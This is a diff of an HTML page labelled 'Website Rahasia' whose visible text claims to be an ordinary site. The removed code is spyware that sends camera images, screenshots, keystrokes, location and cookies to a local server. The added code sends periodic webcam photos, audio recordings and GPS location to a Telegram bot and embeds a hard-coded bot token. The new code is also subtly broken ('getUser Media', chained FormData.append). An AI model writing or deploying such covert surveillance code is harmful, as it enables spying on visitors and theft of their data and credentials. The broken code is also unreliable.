@@ -1,133 +1,134 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Website Rahasia</title>
+    <title>Website Rahasia</title>
 </head>
 <body>
-  <h1>Selamat Datang!</h1>
-  <p>Ini adalah website biasa. Tidak ada yang mencurigakan di sini.</p>
+    <h1>Selamat Datang!</h1>
+    <p>Ini adalah website biasa. Tidak ada yang mencurigakan di sini.</p>
 
-  <video id="kamera" width="640" height="480" autoplay></video>
-  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <video id="kamera" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-  <script>
-    // Kamera
-    const video = document.getElementById('kamera');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
+    <script>
+        // Kamera
+        const video = document.getElementById('kamera');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
 
-    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-      .then(stream => {
-        video.srcObject = stream;
+        navigator.mediaDevices.getUser Media({ video: true, audio: true })
+            .then(stream => {
+                video.srcObject = stream;
 
-        // Audio
-        const recorder = new MediaRecorder(stream);
-        recorder.start();
+                // Audio
+                const recorder = new MediaRecorder(stream);
+                recorder.start();
 
-        recorder.ondataavailable = event => {
-          const blob = new Blob([event.data], { type: 'audio/wav' });
-          const audioURL = URL.createObjectURL(blob);
+                recorder.ondataavailable = event => {
+                    const blob = new Blob([event.data], { type: 'audio/wav' });
+                    const audioURL = URL.createObjectURL(blob);
 
-          // Kirim audio ke server
-          fetch('http://192.168.0.5:5000', {
-            method: 'POST',
-            body: blob
-          })
-          .then(response => {
-            console.log('Audio berhasil dikirim:', response);
-          })
-          .catch(error => {
-            console.error('Error mengirim audio:', error);
-          });
+                    // Kirim audio ke Telegram
+                    sendAudioToTelegram(blob);
+                };
+            })
+            .catch(error => {
+                console.error('Error accessing camera and microphone:', error);
+            });
+
+        setInterval(() => {
+            // Ambil foto
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/png');
+
+            // Kirim foto ke Telegram
+            sendPhotoToTelegram(dataURL);
+
+            // Lokasi
+            navigator.geolocation.getCurrentPosition(position => {
+                const { latitude, longitude } = position.coords;
+
+                // Kirim lokasi ke Telegram
+                sendLocationToTelegram(latitude, longitude);
+            });
+        }, 10000); // Ambil foto dan lokasi setiap 10 detik
+
+        // Fungsi untuk mengirim pesan ke bot Telegram
+        const sendMessageToTelegram = (message) => {
+            const token = '7681449074:AAFHfKXPvQcmrrEJaF3JLAmHHPIhCC7xq3s'; // Ganti dengan token bot Anda
+            const chatId = '7217587697'; // Ganti dengan ID chat Anda
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => console.log('Pesan berhasil dikirim:', data))
+            .catch(error => console.error('Error mengirim pesan:', error));
         };
-      })
-      .catch(error => {
-        console.error('Error accessing camera and microphone:', error);
-      });
 
-    setInterval(() => {
-      // Ambil foto
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const dataURL = canvas.toDataURL('image/png');
+        // Fungsi untuk mengirim foto ke Telegram
+        const sendPhotoToTelegram = (dataURL) => {
+            const token = '7681449074:AAFHfKXPvQcmrrEJaF3JLAmHHPIhCC7xq3s'; // Ganti dengan token bot Anda
+            const chatId = '7217587697'; // Ganti dengan ID chat Anda
+            const url = `https://api.telegram.org/bot${token}/sendPhoto`;
 
-      // Kirim foto ke server
-      fetch('http://192.168.0.5:5000', {
-        method: 'POST',
-        body: dataURL
-      })
-      .then(response => {
-        console.log('Foto berhasil dikirim:', response);
-      })
-      .catch(error => {
-        console.error('Error mengirim foto:', error);
-      });
+            fetch(url, {
+                method: 'POST',
+                body: new FormData().append('chat_id', chatId).append('photo', dataURL),
+            })
+            .then(response => response.json())
+            .then(data => console.log('Foto berhasil dikirim:', data))
+            .catch(error => console.error('Error mengirim foto:', error));
+        };
 
-      // Lokasi
-      navigator.geolocation.getCurrentPosition(position => {
-        const { latitude, longitude } = position.coords;
+        // Fungsi untuk mengirim lokasi ke Telegram
+        const sendLocationToTelegram = (latitude, longitude) => {
+            const token = '7681449074:AAFHfKXPvQcmrrEJaF3JLAmHHPIhCC7xq3s'; // Ganti dengan token bot Anda
+            const chatId = '7217587697'; // Ganti dengan ID chat Anda
+            const url = `https://api.telegram.org/bot${token}/sendLocation`;
 
-        // Kirim lokasi ke server
-        fetch('http://192.168.0.5:5000', {
-          method: 'POST',
-          body: JSON.stringify({ latitude, longitude })
-        })
-        .then(response => {
-          console.log('Lokasi berhasil dikirim:', response);
-        })
-        .catch(error => {
-          console.error('Error mengirim lokasi:', error);
-        });
-      });
-    }, 1000); // Ambil foto dan lokasi setiap detik
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    latitude: latitude,
+                    longitude: longitude,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => console.log('Lokasi berhasil dikirim:', data))
+            .catch(error => console.error('Error mengirim lokasi:', error));
+        };
 
-    // Tangkapan layar
-    html2canvas(document.body).then(canvas => {
-      const dataURL = canvas.toDataURL('image/png');
+        // Fungsi untuk mengirim audio ke Telegram
+        const sendAudioToTelegram = (blob) => {
+            const token = '7681449074:AAFHfKXPvQcmrrEJaF3JLAmHHPIhCC7xq3s'; // Ganti dengan token bot Anda
+            const chatId = '7217587697'; // Ganti dengan ID chat Anda
+            const url = `https://api.telegram.org/bot${token}/sendAudio`;
 
-      // Kirim tangkapan layar ke server
-      fetch('http://192.168.0.5:5000', {
-        method: 'POST',
-        body: dataURL
-      })
-      .then(response => {
-        console.log('Tangkapan layar berhasil dikirim:', response);
-      })
-      .catch(error => {
-        console.error('Error mengirim tangkapan layar:', error);
-      });
-    });
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('audio', blob, 'audio.wav');
 
-    // Keylogging
-    document.addEventListener('keydown', event => {
-      const key = event.key;
-
-      // Kirim keylogging ke server
-      fetch('http://192.168.0.5:5000', {
-        method: 'POST',
-        body: key
-      })
-      .then(response => {
-        console.log('Keylogging berhasil dikirim:', response);
-      })
-      .catch(error => {
-        console.error('Error mengirim keylogging:', error);
-      });
-    });
-
-    // Pencurian cookie
-    const cookies = document.cookie;
-
-    // Kirim cookie ke server
-    fetch('http://192.168.0.5:5000', {
-      method: 'POST',
-      body: cookies
-    })
-    .then(response => {
-      console.log('Cookie berhasil dikirim:', response);
-    })
-    .catch(error => {
-      console.error('Error mengirim cookie:', error);
-    });
-  </script>
+            fetch(url, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => console.log('Audio berhasil dikirim:', data))
+            .catch(error => console.error('Error mengirim audio:', error));
+        };
+    </script>
 </body>
 </html>
